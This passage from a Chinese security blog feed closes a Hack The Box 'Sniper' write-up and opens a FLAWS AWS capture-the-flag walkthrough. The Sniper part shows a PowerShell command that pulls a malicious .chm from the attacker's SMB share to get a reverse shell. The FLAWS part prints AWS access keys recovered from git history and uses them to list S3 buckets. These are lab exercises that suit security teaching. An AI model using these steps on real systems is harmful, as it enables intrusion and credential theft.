src="https://p3.ssl.qhimg.com/t01ccde97607c96c3fd.png"></p><p>kali监听8888端口，用<code>Chris</code>的权限进入<code>C:\Docs\</code>，从Samba共享目录中将<code>doc.chm</code>复制到当前目录，并命名为<code>instructions.chm</code>：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\Docs> <span class="token function">iwr</span> \\10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>14<span class="token punctuation">.</span>67<span class="token operator">/</span>evil<span class="token operator">/</span>doc<span class="token punctuation">.</span>chm <span class="token operator">-</span>outf <span class="token punctuation">.</span>\instructions<span class="token punctuation">.</span>chm</code></pre><p>等待片刻，成功获取到超级用户的反向shell：</p><p><img src="https://p0.ssl.qhimg.com/t014ab2831a0b14f4cb.png"></p><p><strong>- 成功获得超级用户权限，拿到<code> flag</code>:</strong></p><p><img src="https://p1.ssl.qhimg.com/t01d8daafa316484acd.png"></p><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>对Sniper靶机的渗透测试思路进行一个简单的总结：</p><ul><li><strong>- 信息收集：</strong>查看端口、服务状态，获取网站目录</li><li><strong>- 验证<code>LFI</code>和<code>RFI</code>漏洞</strong></li><li><strong>- 通过Samba服务利用<code>RFI</code>漏洞</strong>：获得iuser的shell</li><li><strong>- 搜寻获取<code>Chris</code>的用户凭证</strong></li><li><strong>- 使用<code>Chris</code>角色在powershell中执行命令，获得<code>Chris</code>的shell</strong>：拿到user flag</li><li><strong>- 构造恶意的<code>.chm</code>文件</strong>：包含反向shell的恶意代码</li><li><strong>- 将恶意文件放入指定目录，等待超级用户执行操作，获取超级用户的shell：</strong>拿到root flag</li></ul>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FLAWS challenge</title>
    <link href="/2020/09/22/FLAWS-challenge/"/>
    <url>/2020/09/22/FLAWS-challenge/</url>
    
    <content type="html"><![CDATA[<p>【文章首发于《安全客》<a href="https://www.anquanke.com/post/id/201460%E3%80%91">https://www.anquanke.com/post/id/201460】</a></p><p><img src="https://p2.ssl.qhimg.com/t0152316050b2c9f8e9.png"></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在学习AWS（Amazon Web Services）的相关知识，发现了一个很有趣的AWS CTF——<a href="http://flaws.cloud/">flaws</a>。对于想了解AWS相关安全知识的小伙伴，FLAWS是一个不错的学习平台。我们可以通过一系列挑战，了解掌握AWS常见的错误和漏洞。这个CTF平台上，并不需要我们关注SQLi、XSS、Buffer overflow等等这些为人熟知的漏洞，所需要关注的点集中在与AWS的特定问题上。</p><p>对于不了解AWS的小伙伴，可以查看<a href="https://aws.amazon.com/">AWS官网</a>查看相关文档，或者查看<a href="https://en.wikipedia.org/wiki/Amazon_Web_Services">AWS的维基百科</a>，了解相关基础知识。</p><p>在FLAWS的挑战网站首页<a href="http://flaws.cloud/">http://flaws.cloud</a> ，有这样一段话：</p><blockquote><p><strong>Scope</strong>: Everything is run out of a single AWS account, and all challenges are sub-domains of <a href="http://flaws.cloud/">flaws.cloud</a>.</p></blockquote><p>也就是说，这个平台的所有内容都运行在一个AWS账户中，并且所有的挑战都是<code>flaws.cloud</code>的子域。</p><p>FLAWS一共包括6个挑战，下面就开始我们的通关之旅吧 =）</p><h2 id="0x01-Level-1"><a href="#0x01-Level-1" class="headerlink" title="0x01 Level 1"></a>0x01 Level 1</h2><blockquote><p>This level is <em>buckets</em> of fun. See if you can find the first sub-domain.</p></blockquote><p>这里的提示中，可以打看到<code>buckets</code>这个关键词，对AWS有了解的小伙伴肯定知道，这里指的就<code>AWS S3 buckets</code>。由于S3存储桶能够托管静态网站，那么<code>flaws.cloud</code>很有可能就放在上面。</p><p>利用<code>nslookup</code>工具进行查询，可以看到IP地址为<code>52.218.218.194</code>：</p><p><img src="https://p3.ssl.qhimg.com/t0162d2fd9d5f2f196e.png"></p><p>利用<code>dig</code>工具进行反向查询，成功得到<code>flaws.cloud</code>的S3存储桶的地址<code>s3-website-us-west-2.amazonaws.com</code>：</p><p><img src="https://p3.ssl.qhimg.com/t014c903087a76e7908.png"></p><p><em>一个额外的小知识：对于每个托管在S3存储桶中的网站，都会被分配一个AWS的域名，而不需要你自己额外配置DNS。所以，<code>flaws.cloud</code>加上它的S3地址：<a href="http://flaws.cloud.s3-website-us-west-2.amazonaws.com/">http://flaws.cloud.s3-website-us-west-2.amazonaws.com/</a> ，也能访问到主页。</em></p><p>通过上述查询，我们知道<code>flaws.cloud</code>是一个在S3中的静态网站，地区位于<code>us-west-2</code>。如果使用一个自定义的域名（比如<code>flaws.cloud</code>）在S3中定义了一个静态站点，那它的<code>bucket name</code>则必须与这个自定义域名一致。对于S3存储桶上HTTP端点的URL遵循固定格式：<code>s3-&lt;region&gt;.amazonaws.com/&lt;bucketname&gt;</code>。基于这个准则，我们可以得出<code>flaws.cloud</code>的S3端点应该是<a href="http://s3-us-west-2.amazonaws.com/flaws.cloud">http://s3-us-west-2.amazonaws.com/flaws.cloud</a> 。</p><p>访问这个链接，返回一个XML，包含以下内容：</p><pre class="language-html" data-language="html"><code class="language-html">This XML file does not appear to have any style information associated with it. The document tree is shown below.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ListBucketResult</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://s3.amazonaws.com/doc/2006-03-01/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Name</span><span class="token punctuation">></span></span>flaws.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Prefix</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Marker</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MaxKeys</span><span class="token punctuation">></span></span>1000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>MaxKeys</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IsTruncated</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>IsTruncated</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Contents</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Key</span><span class="token punctuation">></span></span>hint1.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastModified</span><span class="token punctuation">></span></span>2017-03-14T03:00:38.000Z<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastModified</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ETag</span><span class="token punctuation">></span></span>"f32e6fbab70a118cf4e2dc03fd71c59d"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ETag</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Size</span><span class="token punctuation">></span></span>2575<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Size</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StorageClass</span><span class="token punctuation">></span></span>STANDARD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StorageClass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Contents</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Contents</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Key</span><span class="token punctuation">></span></span>hint2.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastModified</span><span class="token punctuation">></span></span>2017-03-03T04:05:17.000Z<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastModified</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ETag</span><span class="token punctuation">></span></span>"565f14ec1dce259789eb919ead471ab9"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ETag</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Size</span><span class="token punctuation">></span></span>1707<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Size</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StorageClass</span><span class="token punctuation">></span></span>STANDARD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StorageClass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Contents</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Contents</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Key</span><span class="token punctuation">></span></span>hint3.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastModified</span><span class="token punctuation">></span></span>2017-03-03T04:05:11.000Z<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastModified</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ETag</span><span class="token punctuation">></span></span>"ffe5dc34663f83aedaffa512bec04989"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ETag</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Size</span><span class="token punctuation">></span></span>1101<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Size</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StorageClass</span><span class="token punctuation">></span></span>STANDARD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StorageClass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Contents</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Contents</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Key</span><span class="token punctuation">></span></span>index.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastModified</span><span class="token punctuation">></span></span>2018-07-10T16:47:16.000Z<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastModified</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ETag</span><span class="token punctuation">></span></span>"ddd133aef0f381cf0440d5f09648791d"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ETag</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Size</span><span class="token punctuation">></span></span>3082<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Size</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StorageClass</span><span class="token punctuation">></span></span>STANDARD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StorageClass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Contents</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Contents</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Key</span><span class="token punctuation">></span></span>logo.png<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastModified</span><span class="token punctuation">></span></span>2018-07-10T16:47:16.000Z<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastModified</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ETag</span><span class="token punctuation">></span></span>"0623bdd28190d0583ef58379f94c2217"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ETag</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Size</span><span class="token punctuation">></span></span>15979<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Size</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StorageClass</span><span class="token punctuation">></span></span>STANDARD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StorageClass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Contents</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Contents</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Key</span><span class="token punctuation">></span></span>robots.txt<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastModified</span><span class="token punctuation">></span></span>2017-02-27T01:59:28.000Z<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastModified</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ETag</span><span class="token punctuation">></span></span>"9e6836f2de6d6e6691c78a1902bf9156"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ETag</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Size</span><span class="token punctuation">></span></span>46<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Size</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StorageClass</span><span class="token punctuation">></span></span>STANDARD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StorageClass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Contents</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Contents</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Key</span><span class="token punctuation">></span></span>secret-dd02c7c.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Key</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastModified</span><span class="token punctuation">></span></span>2017-02-27T01:59:30.000Z<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastModified</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ETag</span><span class="token punctuation">></span></span>"c5e83d744b4736664ac8375d4464ed4c"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ETag</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Size</span><span class="token punctuation">></span></span>1051<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Size</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>StorageClass</span><span class="token punctuation">></span></span>STANDARD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>StorageClass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Contents</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ListBucketResult</span><span class="token punctuation">></span></span></code></pre><p>我们在页面中发现<code>secret-dd02c7c.html</code>在这个存储桶中：</p><p><img src="https://p2.ssl.qhimg.com/t01f12139851a3eeb64.png"></p><p>访问<a href="http://s3-us-west-2.amazonaws.com/flaws.cloud/secret-dd02c7c.html">http://s3-us-west-2.amazonaws.com/flaws.cloud/secret-dd02c7c.html</a> ，找到level 2的入口，成功通过level 1：</p><p><img src="https://p3.ssl.qhimg.com/t010bb26a6b132de2d2.png"></p><h2 id="0x02-Level-2"><a href="#0x02-Level-2" class="headerlink" title="0x02 Level 2"></a>0x02 Level 2</h2><blockquote><p>The next level is fairly similar, with a slight twist. You’re going to need your own AWS account for this.</p></blockquote><p>这里第二关与第一关类似，可以想到仍然与S3有关，同时考虑到需要我们拥有自己的AWS账号，则可以联系到应该与S3存储桶的跨权限访问有关。</p><p>关于注册AWS免费账号，这里不过多阐述，可以查看这篇文章——<a href="https://zhuanlan.zhihu.com/p/67478818">AWS入门 – 开通海外账户及巧用免费套餐</a>。由于我已经拥有自己的AWS账号，下面开始继续通关挑战。</p><p>首先通过账户的访问秘钥（AWSAccessKeyId、AWSSecretKey）配置AWS CLI：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws configureAWS Access Key ID :********************AWS Secret Access Key :********************:Default region name <span class="token punctuation">[</span>ap-southeast-1<span class="token punctuation">]</span>: us-west-2Default output <span class="token function">format</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span>:</code></pre><p>通过level 2 的入口的URL：<a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/hint1.html">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/hint1.html</a> ，我们知道它的存储桶为<code>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code> 。这时尝试用自身账户配置好的AWS CLI 列出level 2 存储桶中包含的内容，发现<code>secret-e4443fc.html</code>：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws s3 <span class="token function">ls</span> s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --region us-west-2 --recursive<span class="token number">2017</span>-02-27 <span class="token number">10</span>:02:15      <span class="token number">80751</span> everyone.png<span class="token number">2017</span>-03-03 <span class="token number">11</span>:47:17       <span class="token number">1433</span> hint1.html<span class="token number">2017</span>-02-27 <span class="token number">10</span>:04:39       <span class="token number">1035</span> hint2.html<span class="token number">2017</span>-02-27 <span class="token number">10</span>:02:14       <span class="token number">2786</span> index.html<span class="token number">2017</span>-02-27 <span class="token number">10</span>:02:14         <span class="token number">26</span> robots.txt<span class="token number">2017</span>-02-27 <span class="token number">10</span>:02:15       <span class="token number">1051</span> secret-e4443fc.html</code></pre><p>继续参照S3存储桶HTTP端点的URL规则<code>&lt;region&gt;.amazonaws.com/&lt;bucketname&gt;</code>（这里的<code>&lt;bucketname&gt;</code>对应level 2 的存储桶地址<code>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code>），访问这一秘密页面：<a href="http://s3-us-west-2.amazonaws.com/level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html">http://s3-us-west-2.amazonaws.com/level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html</a><br>成功通关level 2，找到level 3的入口。</p><p><img src="https://p4.ssl.qhimg.com/t01276baefad0e6c8da.png"></p><h2 id="0x03-Level-3"><a href="#0x03-Level-3" class="headerlink" title="0x03 Level 3"></a>0x03 Level 3</h2><blockquote><p>The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you’ll find something that will let you list what other buckets are.</p></blockquote><p>这一关依然与前面类似，从S3的思路进行考虑，需要寻找AWS的key。</p><p>尝试访问level 3 的存储桶地址<code>http://s3-us-west-2.amazonaws.com/level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</code>，返回XML：</p><pre class="language-xml" data-language="xml"><code class="language-xml">This XML file does not appear to have any style information associated with it. The document tree is shown below.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ListBucketResult</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://s3.amazonaws.com/doc/2006-03-01/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Name</span><span class="token punctuation">></span></span>level3-9afd3927f195e10225021a578e6f78df.flaws.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Name</span><span class="token punctuation">></span></span>...</code></pre><p>用AWS CLI获取整个列表，发现<code>authenticated_users.png</code> 和一堆<code>.git</code> 目录。：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws s3 <span class="token function">ls</span> s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --recursive<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24         <span class="token number">52</span> .git/COMMIT_EDITMSG<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24         <span class="token number">23</span> .git/HEAD<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">130</span> .git/config<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24         <span class="token number">73</span> .git/description<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">452</span> .git/hooks/applypatch-msg.sample<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">896</span> .git/hooks/commit-msg.sample<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">189</span> .git/hooks/post-update.sample<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">398</span> .git/hooks/pre-applypatch.sample<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24       <span class="token number">1704</span> .git/hooks/pre-commit.sample<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24       <span class="token number">4898</span> .git/hooks/pre-rebase.sample<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24       <span class="token number">1239</span> .git/hooks/prepare-commit-msg.sample<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24       <span class="token number">3611</span> .git/hooks/update.sample<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">600</span> .git/index<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">240</span> .git/info/exclude<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">359</span> .git/logs/HEAD<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">359</span> .git/logs/refs/heads/master<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">679</span> .git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:24        <span class="token number">770</span> .git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25        <span class="token number">820</span> .git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25        <span class="token number">245</span> .git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25     <span class="token number">112013</span> .git/objects/76/e4934c9de40e36f09b4e5538236551529f723c<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25        <span class="token number">560</span> .git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25        <span class="token number">191</span> .git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25         <span class="token number">42</span> .git/objects/c2/aab7e03933a858d1765090928dca4013fe2526<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25        <span class="token number">904</span> .git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25         <span class="token number">98</span> .git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25        <span class="token number">279</span> .git/objects/f2/a144957997f15729d4491f251c3615d508b16a<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25        <span class="token number">125</span> .git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61<span class="token number">2017</span>-09-17 <span class="token number">23</span>:12:25         <span class="token number">41</span> .git/refs/heads/master<span class="token number">2017</span>-02-27 08:14:33     <span class="token number">123637</span> authenticated_users.png<span class="token number">2017</span>-02-27 08:14:34       <span class="token number">1552</span> hint1.html<span class="token number">2017</span>-02-27 08:14:34       <span class="token number">1426</span> hint2.html<span class="token number">2017</span>-02-27 08:14:35       <span class="token number">1247</span> hint3.html<span class="token number">2017</span>-02-27 08:14:33       <span class="token number">1035</span> hint4.html<span class="token number">2017</span>-02-27 <span class="token number">10</span>:05:16       <span class="token number">1703</span> index.html<span class="token number">2017</span>-02-27 08:14:33         <span class="token number">26</span> robots.txt</code></pre><p>查看<code>authenticated_users.png</code> <a href="http://s3-us-west-2.amazonaws.com/level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png">http://s3-us-west-2.amazonaws.com/level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png</a> ，并没有获得有用的信息。</p><p><img src="https://p2.ssl.qhimg.com/t01043d50b99d265506.png"></p><p>将level 3 存储桶上的内容复制一份：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws s3 <span class="token function">cp</span> s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ~/testtest --recursive</code></pre><p>通过浏览<code>.git</code>内部的文件内容， 在<code>.git/COMMIT_EDITMSG</code>中发现<code>Oops, accidentally added something I shouldn&#39;t have</code>，看来上传了敏感的东西。</p><p>查看<code>git log</code>，发现敏感信息：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~<span class="token punctuation">\</span>testtest$ <span class="token function">git</span> logcommit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 <span class="token punctuation">(</span>HEAD -<span class="token operator">></span> master<span class="token punctuation">)</span>Author: 0xdabbad00 <span class="token operator">&lt;</span>scott@summitroute.com<span class="token operator">></span>Date:   Sun Sep <span class="token number">17</span> 09:10:43 <span class="token number">2017</span> -0600    Oops, accidentally added something I shouldn't havecommit f52ec03b227ea6094b04e43f475fb0126edb5a61Author: 0xdabbad00 <span class="token operator">&lt;</span>scott@summitroute.com<span class="token operator">></span>Date:   Sun Sep <span class="token number">17</span> 09:10:07 <span class="token number">2017</span> -0600    first commit</code></pre><p>可以看到，开发人员在提交<code>f52ec03b227ea609b04e43f475fb0126edb5a61</code>时有他不想要的东西，并在提交<code>b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526</code>时删除了它。</p><p>查看<code>f52ec03b227ea609b04e43f475fb0126edb5a61</code>这一提交：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~<span class="token punctuation">\</span>testtest$ <span class="token function">git</span> checkout f52ec03b227ea6094b04e43f475fb0126edb5a61Note: checking out <span class="token string">'f52ec03b227ea6094b04e43f475fb0126edb5a61'</span><span class="token builtin class-name">.</span>You are <span class="token keyword">in</span> <span class="token string">'detached HEAD'</span> state. You can <span class="token function">look</span> around, <span class="token function">make</span> experimentalchanges and commit them, and you can discard any commits you <span class="token function">make</span> <span class="token keyword">in</span> thisstate without impacting any branches by performing another checkout.If you want to create a new branch to retain commits you create, you may<span class="token keyword">do</span> so <span class="token punctuation">(</span>now or later<span class="token punctuation">)</span> by using -b with the checkout <span class="token builtin class-name">command</span> again. Example:  <span class="token function">git</span> checkout -b <span class="token operator">&lt;</span>new-branch-name<span class="token operator">></span>HEAD is now at f52ec03 first commit</code></pre><p>再次查看目录中包含的文件，发现<code>access_keys.txt</code>：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~/testtest$ <span class="token function">ls</span>access_keys.txt  authenticated_users.png  hint1.html  hint2.html  hint3.html </code></pre><p>查看<code>access_keys.txt</code>的内容：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~/testtest$ <span class="token function">cat</span> access_keys.txtaccess_key AKIAJ366LIPB4IJKT7SAsecret_access_key OdNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83Jys</code></pre><p>用获得的<code>access_keys</code>配置AWS CLI：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~/testtest$ aws configure --profile flawsAWS Access Key ID <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: AKIAJ366LIPB4IJKT7SAAWS Secret Access Key <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: OdNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83JysDefault region name <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: us-west-2Default output <span class="token function">format</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span>:</code></pre><p>用这个账户权限看看S3存储桶中有什么有意思的内容：</p><pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws s3 <span class="token function">ls</span> --profile flaws<span class="token number">2017</span>-02-19 03:41:52 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud<span class="token number">2017</span>-05-30 00:34:53 config-bucket-975426262029<span class="token number">2018</span>-07-08 00:09:49 flaws-logs<span class="token number">2017</span>-02-19 03:40:54 flaws.cloud<span class="token number">2017</span>-02-24 <span class="token 